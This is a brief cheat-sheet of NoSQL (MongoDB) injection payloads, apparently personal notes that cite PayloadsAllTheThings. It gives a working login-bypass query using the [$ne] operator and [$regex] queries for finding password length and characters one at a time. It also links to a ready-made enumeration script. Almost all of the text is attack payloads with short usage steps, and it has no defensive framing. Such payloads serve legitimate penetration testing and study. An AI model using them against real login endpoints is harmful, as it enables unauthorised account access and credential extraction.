As always : payloadallthethings

## Bypass authentication 

```username[$ne]=toto&password[$ne]=toto```

## Extract length information :
```username[$ne]=toto&password[$regex]=.{1}```
1. Increase the number until the request change
2. Same principle to search the length of a username

## Find characters in NoSQL
```username[$ne]=toto&password[$regex]=m.*```
or 
```username[$ne]=toto&password[$regex]=m.{length}```

- Ready script, or write your own :) : https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
